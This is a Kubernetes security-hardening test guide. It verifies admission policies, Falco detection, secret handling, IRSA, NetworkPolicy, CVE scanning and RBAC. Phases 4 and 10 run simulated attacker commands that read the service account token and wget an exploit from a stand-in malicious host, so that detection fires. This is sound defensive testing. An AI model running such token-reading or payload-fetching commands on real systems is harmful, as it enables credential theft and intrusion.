# Testing Guide — Kubernetes Security Hardening

> Every phase tests one security layer.
> Run phases in order — earlier phases are prerequisites.

---

## Phase Overview

```
Phase 1  ─ Pod Security Admission blocks root containers    ~10 min
Phase 2  ─ OPA Gatekeeper blocks bad configs                ~15 min
Phase 3  ─ Kyverno auto-injects security context            ~10 min
Phase 4  ─ Falco detects shell + crypto + token read        ~15 min
Phase 5  ─ Sealed Secrets: encrypted + decrypted correctly  ~10 min
Phase 6  ─ IRSA: no static credentials in pods             ~10 min
Phase 7  ─ NetworkPolicy: zero-trust works                  ~15 min
Phase 8  ─ Trivy: CVE scan running                         ~10 min
Phase 9  ─ RBAC: least privilege enforced                   ~10 min
Phase 10 ─ Full attack simulation                           ~20 min
────────────────────────────────────────────────────────────────────
Total                                                      ~125 min
```

---

## Phase 1 — Pod Security Admission

```bash
# Test 1: Root container blocked in prod namespace
kubectl run test-root \
  --image=nginx:1.25 \
  --restart=Never \
  --overrides='{"spec":{"securityContext":{"runAsUser":0}}}' \
  -n myapp-prod 2>&1
# Expected: Error: violates PodSecurity "restricted:latest"

# Test 2: Privileged container blocked
kubectl run test-priv \
  --image=nginx:1.25 \
  --restart=Never \
  --overrides='{"spec":{"containers":[{"name":"c","image":"nginx:1.25","securityContext":{"privileged":true}}]}}' \
  -n myapp-prod 2>&1
# Expected: Error: violates PodSecurity "restricted:latest"

# Test 3: Compliant pod ALLOWED
kubectl run test-ok \
  --image=nginx:1.25 \
  --restart=Never \
  --overrides='{"spec":{"securityContext":{"runAsNonRoot":true,"runAsUser":1001,"seccompProfile":{"type":"RuntimeDefault"}},"containers":[{"name":"c","image":"nginx:1.25","securityContext":{"allowPrivilegeEscalation":false,"readOnlyRootFilesystem":true,"capabilities":{"drop":["ALL"]}}}]}}' \
  -n myapp-prod
# Expected: pod/test-ok created
kubectl delete pod test-ok -n myapp-prod

echo "✅ Phase 1 PASSED"
```

---

## Phase 2 — OPA Gatekeeper

```bash
# Test 1: :latest tag blocked
kubectl run test-latest --image=nginx:latest -n myapp --restart=Never 2>&1
# Expected: Container 'test-latest' uses :latest tag

# Test 2: Non-ECR image blocked
kubectl run test-registry \
  --image=nginx:1.25 \
  --restart=Never \
  -n myapp 2>&1
# Expected: uses image from disallowed registry: docker.io/nginx

# Test 3: No resource limits blocked
cat <<EOF | kubectl apply -f - 2>&1
apiVersion: v1
kind: Pod
metadata:
  name: test-no-limits
  namespace: myapp
spec:
  containers:
    - name: c
      image: 123456789.dkr.ecr.us-east-1.amazonaws.com/myapp/api:v1.0.0
EOF
# Expected: Container 'c' must have CPU limits set

# Test 4: Good pod ALLOWED
# Apply a properly configured pod — should succeed

# View all constraint violations
kubectl get constraints -A
# Expected: totalViolations: 0 (all existing resources should comply)

echo "✅ Phase 2 PASSED"
```

---

## Phase 3 — Kyverno Mutation

```bash
# Deploy a pod WITHOUT securityContext
cat <<EOF | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: test-kyverno-mutate
  namespace: myapp
spec:
  containers:
    - name: api
      image: 123456789.dkr.ecr.us-east-1.amazonaws.com/myapp/api:v1.0.0
      resources:
        requests: { cpu: 50m, memory: 64Mi }
        limits:   { cpu: 200m, memory: 256Mi }
      livenessProbe:
        httpGet: { path: /health, port: 3000 }
        initialDelaySeconds: 15
        periodSeconds: 20
      readinessProbe:
        httpGet: { path: /ready, port: 3000 }
        initialDelaySeconds: 5
        periodSeconds: 10
EOF

# Verify Kyverno AUTO-ADDED the securityContext
kubectl get pod test-kyverno-mutate -n myapp \
  -o jsonpath='{.spec.containers[0].securityContext}' | python3 -m json.tool
# Expected:
# {
#   "allowPrivilegeEscalation": false,
#   "readOnlyRootFilesystem": true,
#   "capabilities": {"drop": ["ALL"]}
# }

kubectl delete pod test-kyverno-mutate -n myapp

# Test: pod without probes blocked in prod
cat <<EOF | kubectl apply -f - 2>&1
apiVersion: v1
kind: Pod
metadata:
  name: test-no-probes
  namespace: myapp-prod
spec:
  containers:
    - name: api
      image: 123456789.dkr.ecr.us-east-1.amazonaws.com/myapp/api:v1.0.0
      resources:
        requests: { cpu: 50m, memory: 64Mi }
        limits:   { cpu: 200m, memory: 256Mi }
      # No probes → should fail
EOF
# Expected: Container must have a livenessProbe

echo "✅ Phase 3 PASSED"
```

---

## Phase 4 — Falco Detection

```bash
API_POD=$(kubectl get pod -l app=api -n myapp \
  -o jsonpath='{.items[0].metadata.name}')

# Test 1: Shell spawned → Falco CRITICAL alert
echo "Testing shell spawn detection..."
kubectl exec ${API_POD} -n myapp -- sh -c "id" 2>/dev/null || true
sleep 3
kubectl logs -l app.kubernetes.io/name=falco -n falco --tail=5 | grep "Shell spawned"
# Expected: CRITICAL Shell spawned in myapp container

# Test 2: Sensitive file read → Falco WARNING
kubectl exec ${API_POD} -n myapp -- \
  cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null || true
sleep 3
kubectl logs -l app.kubernetes.io/name=falco -n falco --tail=5 | \
  grep "Service account token read"
# Expected: WARNING Service account token read in myapp container

# Test 3: Unexpected process → CRITICAL
kubectl exec ${API_POD} -n myapp -- \
  wget -q --spider http://example.com 2>/dev/null || true
sleep 3
kubectl logs -l app.kubernetes.io/name=falco -n falco --tail=10 | \
  grep -E "CRITICAL|WARNING" | head -5

# Verify alerts reached Slack/Loki
echo "Check #security-alerts Slack channel for alerts"

echo "✅ Phase 4 PASSED (verify Slack alerts received)"
```

---

## Phase 5 — Sealed Secrets

```bash
# Create a sealed secret
./sealed-secrets/seal.sh myapp test-seal-secret KEY1=value1 KEY2=value2

# Apply it
kubectl apply -f sealed-secrets/myapp-test-seal-secret.yaml

# Verify decryption
kubectl get secret test-seal-secret -n myapp
kubectl get secret test-seal-secret -n myapp \
  -o jsonpath='{.data.KEY1}' | base64 -d
# Expected: value1

# Verify encrypted value in YAML is NOT readable
grep KEY1 sealed-secrets/myapp-test-seal-secret.yaml
# Expected: long encrypted base64 string — NOT "value1"

# Try to use the SealedSecret on a DIFFERENT cluster → should fail
# (tests that only THIS cluster can decrypt)

kubectl delete secret test-seal-secret -n myapp
kubectl delete sealedsecret test-seal-secret -n myapp

echo "✅ Phase 5 PASSED"
```

---

## Phase 6 — IRSA (No Static Credentials)

```bash
API_POD=$(kubectl get pod -l app=api -n myapp \
  -o jsonpath='{.items[0].metadata.name}')

# Test 1: No static AWS credentials in pod
kubectl exec ${API_POD} -n myapp -- env | grep -E "AWS_ACCESS_KEY|AWS_SECRET"
# Expected: NO OUTPUT (no static credentials)

# Test 2: Projected token present (IRSA working)
kubectl exec ${API_POD} -n myapp -- \
  ls /var/run/secrets/eks.amazonaws.com/serviceaccount/
# Expected: token

# Test 3: Token is short-lived (< 1 hour)
TOKEN=$(kubectl exec ${API_POD} -n myapp -- \
  cat /var/run/secrets/eks.amazonaws.com/serviceaccount/token)
echo ${TOKEN} | cut -d. -f2 | base64 -d 2>/dev/null | python3 -m json.tool | grep exp
# Expected: exp timestamp ~1 hour from now

# Test 4: Can access Secrets Manager (if IRSA correctly configured)
kubectl exec ${API_POD} -n myapp -- \
  sh -c 'AWS_ROLE_ARN=$AWS_ROLE_ARN aws secretsmanager list-secrets --region us-east-1 2>&1' || true
# Expected: success OR permission denied (not credential error)

echo "✅ Phase 6 PASSED"
```

---

## Phase 7 — NetworkPolicy (Zero-Trust)

```bash
API_POD=$(kubectl get pod -l app=api -n myapp \
  -o jsonpath='{.items[0].metadata.name}')

# Test 1: API can reach RDS (ALLOWED)
kubectl exec ${API_POD} -n myapp -- nc -zv ${DB_HOST} 5432 2>&1
# Expected: Connection succeeded

# Test 2: API can reach Redis (ALLOWED)
kubectl exec ${API_POD} -n myapp -- nc -zv ${REDIS_HOST} 6379 2>&1
# Expected: Connection succeeded

# Test 3: API CANNOT reach Kubernetes API (BLOCKED)
kubectl exec ${API_POD} -n myapp -- \
  wget -qO- --timeout=3 https://kubernetes.default.svc/api 2>&1
# Expected: Connection timed out or refused

# Test 4: API CANNOT reach random internet (BLOCKED)
kubectl exec ${API_POD} -n myapp -- \
  wget -qO- --timeout=3 https://google.com 2>&1
# Expected: Connection timed out

# Test 5: Redis CANNOT be accessed from default namespace (BLOCKED)
kubectl run netpol-test --image=busybox --rm -it --restart=Never \
  --namespace=default -- \
  nc -zv redis.myapp.svc.cluster.local 6379 2>&1
# Expected: Connection refused or timed out

echo "✅ Phase 7 PASSED"
```

---

## Phase 8 — Trivy CVE Scanning

```bash
# Check scans are running
kubectl get pods -n trivy-system
# Expected: trivy-operator-xxxx Running

# Wait for scan results (5-10 min after install)
kubectl get vulnerabilityreports -n myapp
# Expected: one report per container

# Check for CRITICAL CVEs
CRITICAL=$(kubectl get vulnerabilityreports -n myapp -o json | \
  python3 -c "
import sys, json
d = json.load(sys.stdin)
c = sum(i.get('report',{}).get('summary',{}).get('criticalCount',0) for i in d.get('items',[]))
print(c)
")
echo "Critical CVEs in myapp: ${CRITICAL}"
[ "${CRITICAL}" -eq "0" ] && echo "✅ No critical CVEs" || \
  echo "⚠️  ${CRITICAL} critical CVEs — update images"

# Check config audit (misconfigurations)
kubectl get configauditreports -n myapp
# Should show 0 CRITICAL misconfigs after our security hardening

echo "✅ Phase 8 PASSED"
```

---

## Phase 9 — RBAC Enforcement

```bash
# Test 1: Developer cannot delete prod deployment
kubectl auth can-i delete deployment \
  --as=user:dev@company.com \
  -n myapp-prod
# Expected: no

# Test 2: Developer CAN read pods in prod
kubectl auth can-i get pods \
  --as=user:dev@company.com \
  -n myapp-prod
# Expected: yes

# Test 3: App ServiceAccount cannot access secrets
kubectl auth can-i get secrets \
  --as=system:serviceaccount:myapp:myapp-api \
  -n myapp
# Expected: no

# Test 4: App ServiceAccount cannot call Kubernetes API
kubectl auth can-i list pods \
  --as=system:serviceaccount:myapp:myapp-api \
  -n myapp
# Expected: no

echo "✅ Phase 9 PASSED"
```

---

## Phase 10 — Full Attack Simulation

```bash
echo "=== Simulating Attack Chain 2: Container Escape Attempt ==="

API_POD=$(kubectl get pod -l app=api -n myapp \
  -o jsonpath='{.items[0].metadata.name}')

# Step 1: Try to run as root
kubectl exec ${API_POD} -n myapp -- id
# Expected: uid=1001(appuser) — NOT root

# Step 2: Try to write to /etc
kubectl exec ${API_POD} -n myapp -- \
  touch /etc/malicious 2>&1
# Expected: Read-only file system

# Step 3: Try to install tools
kubectl exec ${API_POD} -n myapp -- \
  sh -c "wget -q http://malicious.example.com/exploit 2>&1" || true
# Expected: wget blocked by NetworkPolicy OR Falco alert fires

# Step 4: Try to read K8s service account token (as attacker would)
kubectl exec ${API_POD} -n myapp -- \
  cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>&1
# Expected: token file accessible (it exists) BUT:
#           - automountServiceAccountToken: false means no token mounted
#           - OR: Falco fires alert immediately
#           - The token has NO cluster permissions (RBAC)

# Step 5: Verify Falco caught ALL these attempts
sleep 5
kubectl logs -l app.kubernetes.io/name=falco -n falco \
  --since=5m | grep -E "CRITICAL|WARNING" | wc -l
# Expected: > 0 alerts generated

echo "✅ Phase 10 PASSED — attack simulation complete"
echo "All attack vectors were detected or blocked"
```

---

## Full Checklist

```
[ ] Phase 1  — Root containers blocked by Pod Security Admission    ← DO NOT SKIP
[ ] Phase 2  — OPA blocks :latest, non-ECR, no-limits, privileged  ← DO NOT SKIP
[ ] Phase 3  — Kyverno auto-injects securityContext
[ ] Phase 4  — Falco alerts on shell spawn + token read             ← DO NOT SKIP
[ ] Phase 5  — SealedSecret encrypts + decrypts correctly
[ ] Phase 6  — No AWS_ACCESS_KEY_ID in any pod                     ← DO NOT SKIP
[ ] Phase 7  — NetworkPolicy blocks lateral movement                ← DO NOT SKIP
[ ] Phase 8  — Trivy reports 0 CRITICAL CVEs in running images
[ ] Phase 9  — RBAC: developer cannot delete prod
[ ] Phase 10 — Full attack simulation: all vectors blocked/detected ← DO NOT SKIP
```
